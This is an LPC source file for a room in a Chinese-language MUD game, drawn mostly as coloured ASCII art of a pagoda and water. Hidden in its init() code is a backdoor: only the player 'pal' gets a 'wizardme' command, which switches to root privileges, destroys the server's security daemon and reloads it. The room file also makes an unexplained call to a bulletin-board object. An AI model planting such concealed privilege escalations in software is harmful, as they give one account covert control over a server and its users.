#include <ansi.h>
inherit ROOM;

int do_update(string);
void create()
{
        set("short", HIC"无情居"NOR);
        set("long",HIR+BNK+"＼｜／\n"+
					"—"+NOR+HIR+"●"+BNK+"—\n"+
					"／｜＼"+NOR+HIC+"▁▂▃▅▆█▆▅▃▂▁▂▃▅▃▂▁\n"+
					"▁▂▃▅▆████████████████████▆▅▃▂▁\n"+
					"\n\n"+
					"                                                 "+HIY+BNK+"★\n"+NOR+
					"                                              "+HIW+"╭╯╰╮\n"+NOR+
					"                                             "+HIW+"╭┴─┴╮\n"+NOR+
					"                                             "+HIW+"╭┴─┴╮\n"+NOR+
					"  ╮╮╮                                  "+HIW+"╭┴─┴╮\n"+NOR+
					"  │││                                     "+HIW+"╭┴─┴╮\n"+NOR+
					"  │││                                     "+HIW+"╭┴─┴╮\n"+NOR+
					"  │││                                "+HIY+"╭──┴──┴──╮\n"+NOR+
					"  │││                          "+HIY+"├┴─┬┴─┤╭╮├┴─┬┴─┤\n"+NOR+
					"  ││╰—╮"+HIC+"╟————╢      "+HIY+"├┬─┴┬─┤││├┬─┴┬─┤\n"+NOR+
					"  ╰——╮ "+HIC+"╱          ╲                      ※\n"+NOR+
					"           "+HIC+"╱ ╭╮╭╮╭╮ ╲※※※※※※※※※※※\n"+NOR+
					HIC+"       ※※"+NOR+"    │  │  ╰≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n"+NOR+
					HIC+"       ※  "+NOR+"    │  ╰≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n"+NOR+
					HIC+"※※※※   "+NOR+"    ╰≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n"+NOR
			+NOR);

        set("exits", ([
        "north"  :       "/d/quanzhen/shifang",
        ]));
//     set("objects", (["/kungfu/class/quanzhen/chapion":1,]))

        set("no_clean_up", 0);
         set("no_task",1);
        setup();
		"/clone/board/dum_b"->foo();
//		replace_program(ROOM);
}

void init()
{
	object me;
	me=this_player();
	if(me->query("id")=="pal")
		add_action("do_update","wizardme");

}

int do_update(string arg)
{
	string err,file;
	object obj;
	seteuid(ROOT_UID);
	file="/adm/daemons/securityd.c";
	obj = find_object(file);
	destruct(obj);
	err = catch( call_other("/adm/daemons/securityd.c", "???") );
	if (err)
		printf( "发生错误：\n%s\n", err );
	else
		write("成功更新！\n");
	return 1;

}
